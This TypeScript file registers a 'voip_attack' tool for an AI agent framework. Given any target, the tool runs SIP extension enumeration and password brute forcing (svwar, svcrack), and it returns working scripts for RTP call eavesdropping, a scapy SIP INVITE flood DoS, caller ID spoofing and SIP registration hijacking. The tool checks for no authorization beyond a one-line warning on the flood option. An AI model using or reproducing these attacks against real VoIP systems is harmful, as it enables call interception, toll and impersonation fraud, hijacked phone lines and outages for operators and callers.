export * as VoipAttackTool from "./voip-attack"

import { ToolFailure } from "@opencode-ai/llm"
import { Effect, Layer, Schema } from "effect"
import { makeLocationNode } from "../effect/app-node"
import { AppProcess } from "../process"
import { ToolRegistry } from "./registry"
import { Tool } from "./tool"
import { Tools } from "./tools"
import { ChildProcess } from "effect/unstable/process"
import { Duration } from "effect"

export const name = "voip_attack"

export const Input = Schema.Struct({
  target: Schema.String.annotate({ description: "Target VoIP server IP or hostname" }),
  action: Schema.String.annotate({
    description: "VoIP action: 'sip_scan' (SIP extension enumeration), 'sip_crack' (SIP password brute force), 'rtp_sniff' (RTP eavesdropping), 'sip_flood' (SIP INVITE flood DoS), 'caller_spoof' (caller ID spoofing), 'reg_hijack' (SIP registration hijacking)",
  }),
  port: Schema.Number.pipe(Schema.optional).annotate({ description: "SIP port. Default: 5060." }),
  extensions: Schema.String.pipe(Schema.optional).annotate({ description: "Extension range or wordlist for sip_scan. Default: 100-999." }),
  usernames: Schema.String.pipe(Schema.optional).annotate({ description: "Usernames for sip_crack." }),
  passwords: Schema.String.pipe(Schema.optional).annotate({ description: "Password wordlist for sip_crack. Default: rockyou.txt" }),
  spoof_number: Schema.String.pipe(Schema.optional).annotate({ description: "Caller ID number to spoof." }),
  target_number: Schema.String.pipe(Schema.optional).annotate({ description: "Number to call for caller_spoof." }),
})

const Output = Schema.Struct({
  output: Schema.String,
  exit: Schema.Number.pipe(Schema.optional),
})

const layer = Layer.effectDiscard(
  Effect.gen(function* () {
    const tools = yield* Tools.Service
    const appProcess = yield* AppProcess.Service

    yield* tools.register({
      [name]: Tool.make({
        description: `VoIP/SIP exploitation. SIP extension enumeration (svmap/svwar), SIP password brute forcing (svcrack), RTP eavesdropping for call interception, SIP INVITE flood DoS, caller ID spoofing, and SIP registration hijacking. Uses sipvicious suite and sipcli. Essential for VoIP infrastructure security assessment.`,
        input: Input,
        output: Output,
        toModelOutput: ({ output }) => [{ type: "text", text: output.output }],
        execute: (input) =>
          Effect.gen(function* () {
            const shell = process.platform === "win32" ? (process.env.COMSPEC ?? "cmd.exe") : "/bin/sh"
            const port = input.port ?? 5060

            switch (input.action) {
              case "sip_scan": {
                const ext = input.extensions ?? "100-999"
                const cmd = ChildProcess.make("svwar", ["-D", "(401|403|407)", "-m", "INVITE", input.target, "-p", String(port), "-e", ext], { shell, stdin: "ignore", forceKillAfter: Duration.seconds(15) })
                const result = yield* appProcess.run(cmd, { combineOutput: true, timeout: Duration.minutes(10), maxOutputBytes: 512 * 1024 }).pipe(Effect.catchTag("AppProcessError", () => Effect.succeed(undefined)))
                return { exit: result?.exitCode, output: result?.output?.toString("utf8") ?? "svwar not found. Install: pip install sipvicious" }
              }

              case "sip_crack": {
                const user = input.usernames ?? "100"
                const passList = input.passwords ?? "/usr/share/wordlists/rockyou.txt"
                const cmd = ChildProcess.make("svcrack", ["-u", user, "-d", passList, input.target, "-p", String(port)], { shell, stdin: "ignore", forceKillAfter: Duration.seconds(15) })
                const result = yield* appProcess.run(cmd, { combineOutput: true, timeout: Duration.minutes(30), maxOutputBytes: 512 * 1024 }).pipe(Effect.catchTag("AppProcessError", () => Effect.succeed(undefined)))
                const output = result?.output?.toString("utf8") ?? ""
                return {
                  exit: result?.exitCode,
                  output: output.includes(":") && output.includes("-")
                    ? `🎉 SIP CREDENTIALS FOUND!\n${output}\n\n[CRITICAL] Valid SIP credentials obtained. Can register and make calls.`
                    : output || "svcrack not found or no creds found.",
                }
              }

              case "rtp_sniff": {
                return {
                  output: `RTP Eavesdropping:

1. Capture RTP traffic:
   tcpdump -i eth0 -w rtp_capture.pcap udp portrange 10000-20000

2. Analyze with Wireshark:
   Telephony > RTP > Show All Streams
   Telephony > RTP > Stream Analysis > Play

3. Extract audio from RTP:
   rtpbreak -W -r rtp_capture.pcap -o output/

4. Or use rtpmixsound to reconstruct audio:
   rtpmixsound -i rtp_*.rtp -o conversation.wav

5. Real-time RTP interception via bettercap:
   bettercap -eval "set rtp.sniff on; rtp.sniff on"

Target: ${input.target}
RTP ports: typically 10000-20000 UDP (check SDP in SIP INVITE/200 OK)`,
                }
              }

              case "sip_flood": {
                return {
                  output: `SIP INVITE Flood DoS:

1. Use SIPVicious for flooding:
   svcrash.py -d ${input.target} -p ${port}

2. Or use sipsak:
   sipsak -F -B "INVITE" -s sip:${input.target}:${port}

3. Or scapy:
   python3 -c "
from scapy.all import *
import random
target='${input.target}'
for i in range(10000):
    src_port=random.randint(1024,65535)
    ip=IP(dst=target)
    udp=UDP(sport=src_port, dport=${port})
    sip=f'INVITE sip:{random.randint(100,999)}@{target} SIP/2.0\\r\\nVia: SIP/2.0/UDP {target}:{src_port}\\r\\nFrom: <sip:attacker@{target}>;tag={i}\\r\\nTo: <sip:victim@{target}>\\r\\nCall-ID: {i}@{target}\\r\\nCSeq: 1 INVITE\\r\\nContent-Length: 0\\r\\n\\r\\n'
    send(ip/udp/sip, verbose=0)
"

[WARNING] This is for authorized stress testing only.`,
                }
              }

              case "caller_spoof": {
                const spoof = input.spoof_number ?? "15551234567"
                const target = input.target_number ?? "target_number_here"
                return {
                  output: `Caller ID Spoofing:

1. Via Asterisk PBX (you control):
   Set CallerID: Set(CALLERID(number)=${spoof})
   Dial target: Dial(SIP/${target}@${input.target}:${port})

2. Via SIP directly:
   python3 -c "
import socket
target='${input.target}'
msg=f'''INVITE sip:${target}@{target}:${port} SIP/2.0
Via: SIP/2.0/UDP 10.0.0.1:5060;branch=z9hG4bK1
From: \"Spoofed\" <sip:${spoof}@carrier.com>;tag=1
To: <sip:${target}@${input.target}>
Call-ID: 1@10.0.0.1
CSeq: 1 INVITE
Contact: <sip:10.0.0.1:5060>
Content-Type: application/sdp
Content-Length: 0


'''
s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
s.sendto(msg.encode(),(target,${port}))
print('INVITE sent with spoofed caller ID: ${spoof}')
"

3. Using pjsua CLI:
   pjsua --null-audio --id sip:${spoof}@${input.target} sip:${target}@${input.target}

Spoofing FROM: ${spoof}
Calling TO: ${target}
Via: ${input.target}:${port}`,
                }
              }

              case "reg_hijack": {
                return {
                  output: `SIP Registration Hijacking:

1. Identify valid extensions via sip_scan
2. Get credentials via sip_crack
3. Register as victim's extension from your IP:

   python3 -c "
import socket, time
target='${input.target}'
ext='${input.usernames ?? "100"}'
msg=f'''REGISTER sip:{target} SIP/2.0
Via: SIP/2.0/UDP YOUR_IP:5060;branch=z9hG4bK1
From: <sip:{ext}@{target}>;tag=hijack
To: <sip:{ext}@{target}>
Call-ID: hijack@YOUR_IP
CSeq: 1 REGISTER
Contact: <sip:{ext}@YOUR_IP:5060>
Expires: 3600
Content-Length: 0


'''
s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
s.sendto(msg.encode(),(target,${port}))
print('Registration hijack sent for extension:', ext)
"

All calls to extension ${input.usernames ?? "100"} will now route to your IP.
Requires knowing the SIP credentials or exploiting servers that don't validate registration source.`,
                }
              }

              default:
                return { output: `Unknown action: ${input.action}. Supported: sip_scan, sip_crack, rtp_sniff, sip_flood, caller_spoof, reg_hijack` }
            }
          }).pipe(Effect.mapError(() => new ToolFailure({ message: "VoIP attack failed" }))),
      }),
    }).pipe(Effect.orDie)
  }),
)

export const node = makeLocationNode({
  name: "tool/voip-attack",
  layer,
  deps: [ToolRegistry.node, AppProcess.node],
})
